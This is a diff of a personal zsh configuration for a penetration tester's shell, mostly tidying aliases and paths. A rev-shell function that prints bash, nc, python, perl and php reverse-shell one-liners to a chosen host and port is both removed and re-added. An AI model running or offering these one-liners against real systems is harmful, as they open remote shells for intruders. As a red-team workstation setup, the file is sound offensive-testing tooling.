@@ -4,11 +4,21 @@
 # ----------------------
 # Homebrew Configuration (macOS)
 # ----------------------
-# Auto-configure Homebrew environment on macOS systems
+# Static Homebrew environment (avoids subprocess on every shell start)
 if [[ -d "/opt/homebrew" ]]; then
-    eval "$(/opt/homebrew/bin/brew shellenv)"
+    export HOMEBREW_PREFIX="/opt/homebrew"
+    export HOMEBREW_CELLAR="/opt/homebrew/Cellar"
+    export HOMEBREW_REPOSITORY="/opt/homebrew"
+    export PATH="/opt/homebrew/bin:/opt/homebrew/sbin${PATH+:$PATH}"
+    export MANPATH="/opt/homebrew/share/man${MANPATH+:$MANPATH}:"
+    export INFOPATH="/opt/homebrew/share/info:${INFOPATH:-}"
 elif [[ -d "/usr/local/Homebrew" ]]; then
-    eval "$(/usr/local/bin/brew shellenv)"
+    export HOMEBREW_PREFIX="/usr/local"
+    export HOMEBREW_CELLAR="/usr/local/Cellar"
+    export HOMEBREW_REPOSITORY="/usr/local/Homebrew"
+    export PATH="/usr/local/bin:/usr/local/sbin${PATH+:$PATH}"
+    export MANPATH="/usr/local/share/man${MANPATH+:$MANPATH}:"
+    export INFOPATH="/usr/local/share/info:${INFOPATH:-}"
 fi
 # ----------------------
 # Python 3.13 Configuration
@@ -31,9 +41,7 @@ fi
 # ----------------------
 # Red Team Shell Banner
 # ----------------------
-if command -v figlet &> /dev/null && command -v lolcat &> /dev/null; then
-    figlet -f slant "Red Team Shell" | lolcat
-elif command -v figlet &> /dev/null; then
+if command -v figlet &> /dev/null; then
     figlet -f slant "Red Team Shell"
 else
     echo "🔴 Red Team Shell Ready"
@@ -54,7 +62,6 @@ WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word
 PROMPT_EOL_MARK=""
 
 # configure key keybindings
-# configure key keybindings
 bindkey -e                                        # emacs key bindings
 bindkey ' ' magic-space                           # do history expansion on space
 bindkey '^[[3;5~' kill-word                       # ctrl + Supr
@@ -68,8 +75,8 @@ bindkey '^[[F' end-of-line                        # end
 bindkey '^[[Z' undo                               # shift + tab undo last action
 
 # enable completion features - Enhanced for red team tools
-# Add Docker Desktop and Ludus completions directories so zsh can find definitions
-fpath=(/Users/maleick/.docker/completions /Users/maleick/.config/zsh/completions $fpath)
+# Add custom completions directory (Ludus, etc.)
+fpath=($HOME/.config/zsh/completions $fpath)
 autoload -Uz compinit
 # Speed up compinit by checking cache once per day
 if [[ -n ~/.cache/zcompdump(#qN.mh+24) ]]; then
@@ -88,7 +95,6 @@ zstyle ':completion:*' group-name ''
 
 # Red team tool specific completions
 zstyle ':completion:*:*:nmap:*' file-patterns '*.xml:xml-files *.gnmap:gnmap-files *:all-files'
-zstyle ':completion:*:*:gobuster:*' file-patterns '*.txt:wordlists *:all-files'
 
 # History configurations - Enhanced for Red Team operations
 HISTFILE=~/.zsh_history
@@ -100,15 +106,11 @@ setopt hist_ignore_space      # ignore commands that start with space (good for 
 setopt hist_verify            # show command with history expansion to user before running it
 setopt hist_reduce_blanks     # remove superfluous blanks from history items
 setopt inc_append_history     # write to history file immediately, not when shell exits
-#setopt share_history         # share command history data
 
 # force zsh to show the complete history
 alias history="history 0"
 
-# make less more friendly for non-text input files, see lesspipe(1)
-#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
-
-# set a fancy prompt (non-color, unless we know we "want" color)
+# set a fancy prompt
 case "$TERM" in
     xterm-color|*-256color) color_prompt=yes;;
 esac
@@ -220,12 +222,12 @@ precmd() {
 }
 
 # enable color support of ls, less and man, and also add handy aliases
-	export CLICOLOR=YES
-    alias grep='grep --color=auto'
-    alias fgrep='fgrep --color=auto'
-    alias egrep='egrep --color=auto'
-    alias diff='diff --color=auto'
-    alias ip='ip --color=auto'
+export CLICOLOR=YES
+alias grep='grep --color=auto'
+alias fgrep='fgrep --color=auto'
+alias egrep='egrep --color=auto'
+alias diff='diff --color=auto'
+alias ip='ip --color=auto'
 
 # Enhanced ls aliases with colors
 alias ll='ls -alF'
@@ -240,7 +242,6 @@ alias a='aliasr'
 # Red team specific aliases
 # External IP address commands
 alias myip='curl -s -4 ifconfig.me'  # Force IPv4
-alias myip4='curl -s -4 ifconfig.me'
 alias myip6='curl -s -6 ifconfig.me'
 alias myip-alt='curl -s -4 ipinfo.io/ip'  # Alternative service
 alias myip-check='curl -s -4 icanhazip.com'  # Backup service
@@ -251,10 +252,9 @@ get_external_ip() {
     EXTERNAL_IP=$(curl -s -4 ifconfig.me)
     echo "External IP: $EXTERNAL_IP (stored in \$EXTERNAL_IP variable)"
 }
-alias ports='netstat -tuln'
-alias listening='netstat -an | grep LISTEN'
+alias ports='lsof -iTCP -sTCP:LISTEN -P -n'  # macOS-compatible
+alias listening='lsof -iTCP -sTCP:LISTEN -P -n'
 alias webserver='python3 -m http.server 8080'
-alias smbserver='impacket-smbserver share . -smb2support'
 alias urlencode='python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))"'
 alias urldecode='python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))"'
 # Fixed base64 functions (macOS compatible)
@@ -288,36 +288,7 @@ alias https-server='python3 -m http.server --cert-file=cert.pem --key-file=key.p
 # Scan top 1000 TCP ports with service and version detection
 alias nmap-top-ports='nmap -sV -sC --top-ports=1000'
 
-# -- Reverse Shells --
-# Generate reverse shell one-liners
-rev-shell() {
-    echo "Usage: rev-shell <type> <lhost> <lport>"
-    echo "Types: bash, nc, python, perl, php"
-    case "$1" in
-        bash)
-            echo "bash -i >& /dev/tcp/$2/$3 0>&1"
-            ;;
-        nc)
-            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
-            ;;
-        python)
-            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((("$2",$3)));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
-            ;;
-        perl)
-            echo "perl -e 'use Socket;$i=\"$2\";$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\\&S\");open(STDOUT,\">\\&S\");open(STDERR,\">\\&S\");exec(\"/bin/sh -i\");};'"
-            ;;
-        php)
-            echo "php -r '$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <\\&3 >\\&3 2\\&3\");'"
-            ;;
-    esac
-}
-
 # -- Red Team Functions --
-# Show tun0 IP in prompt
-get_tun0_ip() {
-    ip addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
-}
-
 # Quick port scanner
 quickscan() {
     if [[ -z "$1" ]]; then
@@ -369,6 +340,24 @@ netinfo() {
     echo "DNS Servers: $(scutil --dns 2>/dev/null | grep nameserver | awk '{print $3}' | sort -u | tr '\n' ' ' || cat /etc/resolv.conf | grep nameserver | awk '{print $2}' | tr '\n' ' ')"
 }
 
+# -- Reverse Shell Generator --
+rev-shell() {
+    if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
+        echo "Usage: rev-shell <type> <lhost> <lport>"
+        echo "Types: bash, nc, python, perl, php"
+        return 1
+    fi
+    local type="$1" lhost="$2" lport="$3"
+    case "$type" in
+        bash)   echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
+        nc)     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" ;;
+        python) echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
+        perl)   echo "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
+        php)    echo "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
+        *)      echo "Unknown type: $type (use bash, nc, python, perl, php)" ;;
+    esac
+}
+
 echo "Type /help for a list of commands."
 
 # -- Help Command --
@@ -380,29 +369,27 @@ echo "Type /help for a list of commands."
 🚀 Web Servers:
     http-server / webserver: Start HTTP server (port 8000/8080)
     https-server: Start HTTPS server (requires cert.pem/key.pem)
-    smbserver: Start SMB server in current directory
 
 🔍 Network & Scanning:
     nmap-top-ports <target>: Quick nmap scan of top 1000 ports
     quickscan <target>: Fast nmap scan (-T4 -F)
-    myip / myip4: Show external IPv4 address
+    myip: Show external IPv4 address
     myip6: Show external IPv6 address
-    myip-alt: Alternative external IPv4 service (ipinfo.io)
-    myip-check: Backup external IPv4 service (icanhazip.com)
-    get_external_ip: Get IP and store in $EXTERNAL_IP variable
+    myip-alt / myip-check: Alternative IP services
+    get_external_ip: Get IP and store in \$EXTERNAL_IP variable
     localip: Show local IP address
     netinfo: Display comprehensive network information
-    ports / listening: Show open ports
+    ports / listening: Show listening TCP ports
 
 📜 Encoding/Decoding:
     base64encode <text>: Base64 encode
     base64decode <text>: Base64 decode
-    urlencode <text>: URL encode
-    urldecode <text>: URL decode
+    urlencode / urldecode <text>: URL encode/decode
     rot13: ROT13 cipher
     hexdump <file>: Hexadecimal dump
 
 🛠️ Red Team Tools:
+    a: Launch aliasr TUI for pentest commands
     rev-shell <type> <lhost> <lport>: Generate reverse shell
         Types: bash, nc, python, perl, php
     extract <file>: Extract various archive formats
@@ -414,6 +401,9 @@ echo "Type /help for a list of commands."
 🎥 Tmux (if available):
     Prefix + P: Start/Stop asciinema recording
     Prefix + N: Create new session
+    Prefix + r: Reload tmux config
+    Prefix + U: Open aliasr (send to pane)
+    Prefix + K: Open aliasr (send + execute)
     Prefix + p/n: Previous/Next window
 
 📚 Documentation:
@@ -427,36 +417,14 @@ echo "Type /help for a list of commands."
 export PATH="/opt/homebrew/opt/openjdk@17/bin:$PATH"
 export CPPFLAGS="-I/opt/homebrew/opt/openjdk@17/include"
 
-# Generated for pdtm. Do not edit.
-export PATH="/Users/maleick/.pdtm/go/bin:$PATH"
+# Go and pdtm paths
+export PATH="$HOME/.pdtm/go/bin:$HOME/go/bin:$PATH"
 
+# pipx
+export PATH="$PATH:$HOME/.local/bin"
 
-# Generated for pdtm. Do not edit.
-export PATH=$PATH:/Users/maleick/go
-
-
-# Suppress Node.js punycode deprecation warning
-export NODE_OPTIONS="--no-deprecation"
-export PATH="/opt/homebrew/opt/node@22/bin:$PATH"
-
-# Ludus API Configuration
-# Loaded from ~/.zshrc.local (not synced to git)
-
-# OpenClaw Completion
-if command -v openclaw >/dev/null 2>&1; then
-    source <(openclaw completion --shell zsh)
-fi
-
-# Auto-start Obsidian REST API via Tailscale Serve
-if command -v tailscale >/dev/null 2>&1; then
-  tailscale serve --bg --https 27123 http://localhost:27123 >/dev/null 2>&1 || true
-fi
-
-# Load local overrides (sensitive data, machine-specific configs)
+# Load local overrides
 # This file is NOT synced to git - create it manually on each machine
 if [[ -f "$HOME/.zshrc.local" ]]; then
     source "$HOME/.zshrc.local"
 fi
-
-# Created by `pipx` on 2026-02-02 17:25:57
-export PATH="$PATH:/Users/maleick/.local/bin"
